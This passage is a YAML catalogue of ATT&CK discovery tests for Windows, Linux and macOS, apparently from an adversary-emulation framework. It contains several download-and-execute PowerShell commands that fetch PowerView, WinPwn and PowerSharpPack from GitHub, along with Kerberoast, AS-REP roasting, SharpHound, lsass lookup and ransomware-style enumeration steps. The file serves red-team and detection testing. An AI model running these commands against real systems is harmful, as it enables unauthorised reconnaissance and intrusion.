    - name: System Network Connections Discovery with PowerShell
      type: powershell
      platform: windows
      command: Get-NetTCPConnection
      timeout: 120
    - name: System Network Connections Discovery via PowerShell (Process Mapping)
      type: powershell
      platform: windows
      command: |-
        Get-NetTCPConnection | ForEach-Object {
          $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
          [pscustomobject]@{
            Local   = "$($_.LocalAddress):$($_.LocalPort)"
            Remote  = "$($_.RemoteAddress):$($_.RemotePort)"
            State   = $_.State
            PID     = $_.OwningProcess
            Process = if ($p) { $p.ProcessName } else { $null }
          }
        } | Sort-Object State,Process | Format-Table -AutoSize
      timeout: 120
    - name: System Network Connections Discovery via ss or lsof (Linux/MacOS)
      type: bash
      platform: linux
      command: if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi
      timeout: 60
    - name: System Network Connections Discovery via ss or lsof (Linux/MacOS)
      type: bash
      platform: macos
      command: if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi
      timeout: 60
    - name: System Network Connections Discovery FreeBSD, Linux & MacOS
      type: sh
      platform: linux
      command: |-
        netstat
        who -a
      timeout: 60
    - name: System Network Connections Discovery FreeBSD, Linux & MacOS
      type: sh
      platform: macos
      command: |-
        netstat
        who -a
      timeout: 60
    - name: System Network Connections Discovery via sockstat (Linux, FreeBSD)
      type: sh
      platform: linux
      command: |-
        sockstat -4
        sockstat -6 2>/dev/null || true
        sockstat -l 2>/dev/null || true
      timeout: 60
    - name: System Discovery using SharpView
      type: powershell
      platform: windows
      command: "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n\nforeach ($syntax in $syntaxList) {\nPathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $syntax -}"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1049
  is_safe: false
- id: T1057
  name: Process Discovery
  description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infe...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Process Discovery - ps
      type: sh
      platform: linux
      command: |-
        ps >> /tmp/loot.txt
        ps aux >> /tmp/loot.txt
      cleanup: rm /tmp/loot.txt
      timeout: 60
    - name: Process Discovery - ps
      type: sh
      platform: macos
      command: |-
        ps >> /tmp/loot.txt
        ps aux >> /tmp/loot.txt
      cleanup: rm /tmp/loot.txt
      timeout: 60
    - name: Process Discovery - tasklist
      type: cmd
      platform: windows
      command: tasklist
      timeout: 120
    - name: Process Discovery - Get-Process
      type: powershell
      platform: windows
      command: Get-Process
      timeout: 120
    - name: Process Discovery - get-wmiObject
      type: powershell
      platform: windows
      command: get-wmiObject -class Win32_Process
      timeout: 120
    - name: Process Discovery - wmic process
      type: cmd
      platform: windows
      command: wmic process get /format:list
      timeout: 120
    - name: Discover Specific Process - tasklist
      type: cmd
      platform: windows
      command: tasklist | findstr lsass
      timeout: 120
    - name: Process Discovery - Process Hacker
      type: powershell
      platform: windows
      command: Start-Process -FilePath "$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe"
      timeout: 120
      elevation_required: true
    - name: Process Discovery - PC Hunter
      type: powershell
      platform: windows
      command: Start-Process -FilePath "C:\Temp\ExternalPayloads\PCHunter_free\PChunter64.exe"
      timeout: 120
      elevation_required: true
    - name: Launch Taskmgr from cmd to View running processes
      type: cmd
      platform: windows
      command: taskmgr.exe /7
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1057
  is_safe: false
- id: T1069.001
  name: Local Groups
  description: |-
    Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

    Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Permission Groups Discovery (Local)
      type: sh
      platform: linux
      command: |-
        if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
        cat /etc/group
      timeout: 60
    - name: Permission Groups Discovery (Local)
      type: sh
      platform: macos
      command: |-
        if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
        cat /etc/group
      timeout: 60
    - name: Basic Permission Groups Discovery Windows (Local)
      type: cmd
      platform: windows
      command: |-
        net localgroup
        net localgroup "Administrators"
      timeout: 120
    - name: Permission Groups Discovery PowerShell (Local)
      type: powershell
      platform: windows
      command: |-
        get-localgroup
        Get-LocalGroupMember -Name "Administrators"
      timeout: 120
    - name: SharpHound3 - LocalAdmin
      type: powershell
      platform: windows
      command: |-
        New-Item -Path "$env:TEMP\SharpHound\" -ItemType Directory > $null
        & "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.exe" -d "$env:UserDnsDomain" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "$env:TEMP\SharpHound\"
      cleanup: Remove-Item -Recurse $env:TEMP\SharpHound\ -ErrorAction Ignore
      timeout: 120
    - name: Wmic Group Discovery
      type: cmd
      platform: windows
      command: wmic group get name
      timeout: 120
    - name: WMIObject Group Discovery
      type: powershell
      platform: windows
      command: Get-WMIObject Win32_Group
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1069/001
  is_safe: true
- id: T1069.002
  name: Domain Groups
  description: |-
    Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

    Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, an...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Basic Permission Groups Discovery Windows (Domain)
      type: cmd
      platform: windows
      command: |-
        net localgroup
        net group /domain
        net group "enterprise admins" /domain
        net group "domain admins" /domain
      timeout: 120
    - name: Permission Groups Discovery PowerShell (Domain)
      type: powershell
      platform: windows
      command: get-ADPrincipalGroupMembership $env:USERNAME | select name
      timeout: 120
    - name: Elevated group enumeration using net group (Domain)
      type: cmd
      platform: windows
      command: |-
        net groups "Account Operators" /domain
        net groups "Exchange Organization Management" /domain
        net group "BUILTIN\Backup Operators" /domain
        net group "Domain Admins" /domain
      timeout: 120
    - name: Find machines where user has local admin access (PowerView)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
      timeout: 120
    - name: Find local admins on all machines in domain (PowerView)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
      timeout: 120
    - name: Find Local Admins via Group Policy (PowerView)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose
      timeout: 120
    - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
      type: powershell
      platform: windows
      command: get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
      timeout: 120
    - name: Adfind - Query Active Directory Groups
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group)'
      timeout: 120
    - name: Enumerate Active Directory Groups with Get-AdGroup
      type: powershell
      platform: windows
      command: Get-AdGroup -Filter *
      timeout: 120
    - name: Enumerate Active Directory Groups with ADSISearcher
      type: powershell
      platform: windows
      command: ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
      timeout: 120
    - name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
      type: powershell
      platform: windows
      command: Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
      timeout: 120
    - name: Get-DomainGroupMember with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
      timeout: 120
    - name: Get-DomainGroup with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
      timeout: 120
    - name: Active Directory Enumeration with LDIFDE
      type: cmd
      platform: windows
      command: ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
      cleanup: del C:\Windows\temp\atomic_ldifde.txt
      timeout: 120
      elevation_required: true
    - name: Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS
      type: sh
      platform: linux
      command: ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1069/002
  is_safe: false
- id: T1082
  name: System Information Discovery
  description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System Information Discovery
      type: cmd
      platform: windows
      command: |-
        systeminfo
        reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
      timeout: 120
    - name: System Information Discovery (2)
      type: sh
      platform: macos
      command: |-
        system_profiler
        ls -al /Applications
      timeout: 60
    - name: List OS Information
      type: sh
      platform: linux
      command: "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null"
      cleanup: rm /tmp/T1082.txt 2>/dev/null
      timeout: 60
    - name: List OS Information
      type: sh
      platform: macos
      command: "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null"
      cleanup: rm /tmp/T1082.txt 2>/dev/null
      timeout: 60
    - name: Linux VM Check via Hardware
      type: bash
      platform: linux
      command: |-
        if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
        if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
        if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
        if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
        if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
        if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
        if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
        if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
      timeout: 60
      elevation_required: true
    - name: Linux VM Check via Kernel Modules
      type: bash
      platform: linux
      command: |-
        sudo lsmod | grep -i "vboxsf\|vboxguest"
        sudo lsmod | grep -i "vmw_baloon\|vmxnet"
        sudo lsmod | grep -i "xen-vbd\|xen-vnif"
        sudo lsmod | grep -i "virtio_pci\|virtio_net"
        sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
      timeout: 60
      elevation_required: true
    - name: FreeBSD VM Check via Kernel Modules
      type: sh
      platform: linux
      command: |-
        kldstat | grep -i "vmm"
        kldstat | grep -i "vbox"
      timeout: 60
    - name: Hostname Discovery (Windows)
      type: cmd
      platform: windows
      command: hostname
      timeout: 120
    - name: Hostname Discovery
      type: sh
      platform: linux
      command: hostname
      timeout: 60
    - name: Hostname Discovery
      type: sh
      platform: macos
      command: hostname
      timeout: 60
    - name: Windows MachineGUID Discovery
      type: cmd
      platform: windows
      command: REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
      timeout: 120
    - name: Griffon Recon
      type: powershell
      platform: windows
      command: cscript "PathToAtomicsFolder\T1082\src\griffon_recon.vbs"
      timeout: 120
    - name: Environment variables discovery on windows
      type: cmd
      platform: windows
      command: set
      timeout: 120
    - name: Environment variables discovery on freebsd, macos and linux
      type: sh
      platform: linux
      command: env
      timeout: 60
    - name: Environment variables discovery on freebsd, macos and linux
      type: sh
      platform: macos
      command: env
      timeout: 60
    - name: Show System Integrity Protection status (MacOS)
      type: sh
      platform: macos
      command: csrutil status
      timeout: 60
    - name: WinPwn - winPEAS
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        winPEAS -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - itm4nprivesc
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        itm4nprivesc -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - Powersploits privesc checks
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        oldchecks -noninteractive -consoleoutput
      cleanup: |-
        rm -force -recurse .\DomainRecon -ErrorAction Ignore
        rm -force -recurse .\Exploitation -ErrorAction Ignore
        rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
        rm -force -recurse .\LocalRecon -ErrorAction Ignore
        rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
      timeout: 120
    - name: WinPwn - General privesc checks
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        otherchecks -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - GeneralRecon
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Generalrecon -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - Morerecon
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Morerecon -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - RBCD-Check
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        RBCD-Check -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
        Invoke-watson
      timeout: 120
    - name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
        Invoke-SharpUp -command "audit"
      timeout: 120
    - name: WinPwn - PowerSharpPack - Seatbelt
      type: powershell
      platform: windows
      command: |-
        $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
        Invoke-Seatbelt -Command "-group=all"
      timeout: 120
    - name: Linux List Kernel Modules
      type: sh
      platform: linux
      command: |-
        lsmod
        kmod list
        grep vmw /proc/modules
      timeout: 60
    - name: FreeBSD List Kernel Modules
      type: sh
      platform: linux
      command: |-
        kldstat
        kldstat | grep vmm
      timeout: 60
    - name: System Information Discovery with WMIC
      type: cmd
      platform: windows
      command: |-
        wmic cpu get name
        wmic MEMPHYSICAL get MaxCapacity
        wmic baseboard get product
        wmic baseboard get version
        wmic bios get SMBIOSBIOSVersion
        wmic path win32_VideoController get name
        wmic path win32_VideoController get DriverVersion
        wmic path win32_VideoController get VideoModeDescription
        wmic OS get Caption,OSArchitecture,Version
        wmic DISKDRIVE get Caption
        Get-WmiObject win32_bios
      timeout: 120
    - name: System Information Discovery (3)
      type: cmd
      platform: windows
      command: wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
      timeout: 120
      elevation_required: true
    - name: Check computer location
      type: cmd
      platform: windows
      command: reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
      timeout: 120
    - name: BIOS Information Discovery through Registry
      type: cmd
      platform: windows
      command: |-
        reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
        reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
      timeout: 120
    - name: ESXi - VM Discovery using ESXCLI
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1082\src\esx_vmdiscovery.txt"
      timeout: 120
    - name: ESXi - Darkside system information discovery
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt"
      timeout: 120
    - name: sysctl to gather macOS hardware info
      type: sh
      platform: macos
      command: sysctl -n hw.model
      timeout: 60
    - name: 'operating system discovery '
      type: powershell
      platform: windows
      command: Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null
      timeout: 120
    - name: Check OS version via "ver" command
      type: cmd
      platform: windows
      command: ver
      timeout: 120
    - name: Display volume shadow copies with "vssadmin"
      type: cmd
      platform: windows
      command: vssadmin.exe list shadows
      timeout: 120
      elevation_required: true
    - name: Identify System Locale and Regional Settings with PowerShell
      type: cmd
      platform: windows
      command: powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"
      cleanup: cmd.exe /c del "%TMP%\a.txt"
      timeout: 120
    - name: Enumerate Available Drives via gdr
      type: cmd
      platform: windows
      command: powershell.exe -c "gdr -PSProvider 'FileSystem'"
      timeout: 120
    - name: Discover OS Product Name via Registry
      type: cmd
      platform: windows
      command: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
      timeout: 120
    - name: Discover OS Build Number via Registry
      type: cmd
      platform: windows
      command: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1082
  is_safe: false
- id: T1083
  name: File and Directory Discovery
  description: |-
    Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

    Many command shell utilities can be used to obtain this information. Exa...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: File and Directory Discovery (cmd.exe)
      type: cmd
      platform: windows
      command: |-
        dir /s c:\ >> %temp%\T1083Test1.txt
        dir /s "c:\Documents and Settings" >> %temp%\T1083Test1.txt
        dir /s "c:\Program Files\" >> %temp%\T1083Test1.txt
        dir "%systemdrive%\Users\*.*" >> %temp%\T1083Test1.txt
        dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\T1083Test1.txt
        dir "%userprofile%\Desktop\*.*" >> %temp%\T1083Test1.txt
        tree /F >> %temp%\T1083Test1.txt
      cleanup: del %temp%\T1083Test1.txt
      timeout: 120
    - name: File and Directory Discovery (PowerShell)
      type: powershell
      platform: windows
      command: |-
        ls -recurse
        get-childitem -recurse
        gci -recurse
      timeout: 120
    - name: Nix File and Directory Discovery
      type: sh
      platform: linux
      command: |-
        ls -a >> /tmp/T1083.txt
        if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
        file */* *>> /tmp/T1083.txt
        cat /tmp/T1083.txt 2>/dev/null
        find . -type f
        ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
        locate *
        which sh
      cleanup: rm /tmp/T1083.txt
      timeout: 60
    - name: Nix File and Directory Discovery
      type: sh
      platform: macos
      command: |-
        ls -a >> /tmp/T1083.txt
        if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
        file */* *>> /tmp/T1083.txt
        cat /tmp/T1083.txt 2>/dev/null
        find . -type f
        ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
        locate *
        which sh
      cleanup: rm /tmp/T1083.txt
      timeout: 60
    - name: Nix File and Directory Discovery 2
      type: sh
      platform: linux
      command: |-
        cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
        if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
        find . -type f -iname *.pdf >> /tmp/T1083.txt
        cat /tmp/T1083.txt
        find . -type f -name ".*"
      cleanup: rm /tmp/T1083.txt
      timeout: 60
    - name: Nix File and Directory Discovery 2
      type: sh
      platform: macos
      command: |-
        cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
        if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
        find . -type f -iname *.pdf >> /tmp/T1083.txt
        cat /tmp/T1083.txt
        find . -type f -name ".*"
      cleanup: rm /tmp/T1083.txt
      timeout: 60
    - name: Simulating MAZE Directory Enumeration
      type: powershell
      platform: windows
      command: |-
        $folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")
        Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt
        Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
        Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
        $UsersFolder = "$env:homedrive\Users\"
        foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)
        {
        foreach ($secondarydirectory in $folderarray)
         {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt}
        }
        cat $env:temp\T1083Test5.txt
      cleanup: remove-item $env:temp\T1083Test5.txt -ErrorAction SilentlyContinue
      timeout: 120
    - name: Launch DirLister Executable
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\..\ExternalPayloads\DirLister.exe"
        Start-Sleep -Second 4
        Stop-Process -Name "DirLister"
      timeout: 120
    - name: ESXi - Enumerate VMDKs available on an ESXi Host
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1083\src\esxi_file_discovery.txt"
      timeout: 120
    - name: Identifying Network Shares - Linux
      type: sh
      platform: linux
      command: findmnt -t nfs
      timeout: 60
    - name: Recursive Enumerate Files And Directories By Powershell
      type: powershell
      platform: windows
      command: |-
        $out = "$env:TEMP\T1083-Enumerate-net.txt"
        $dirsFilter = @('Documents','Downloads','Desktop','OneDrive')
        $exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')
        $userProfile = [Environment]::GetFolderPath('UserProfile')
        $tr = [System.Collections.Generic.List[string]]::new()

        function MatchesExtension($path) {
          try {
            $e = [System.IO.Path]::GetExtension($path).ToLower()
            return $exts -contains $e
          } catch { return $false }
        }

        function Scan-Dir($root) {
          try {
            $match = $false
            foreach ($f in $dirsFilter) { if ($root -like "*$f*") { $match = $true; break } }
            if (-not $match) { return }

            [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {
              if (MatchesExtension $_) {
                $fi = [System.IO.FileInfo]::new($_)
                $tr.Add("[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)")
              }
            }

            [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {
              Scan-Dir $_
            }
          } catch [System.UnauthorizedAccessException] {
            $tr.Add("[AccessDenied] $root")
          } catch {
            $tr.Add("[Error] $root => $($_.Exception.Message)")
          }
        }

        [System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }

        # Ensure output dir exists
        $outDir = [System.IO.Path]::GetDirectoryName($out)
        if (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {
          New-Item -Path $outDir -ItemType Directory -Force | Out-Null
        }

        # Write results
        $tr | Out-File -FilePath $out -Encoding UTF8
        Write-Output "Enumeration complete. Results written to: $out"
      cleanup: Remove-Item -Path "$env:TEMP\T1083-Enumerate-net.txt" -ErrorAction SilentlyContinue
      timeout: 120
  references:
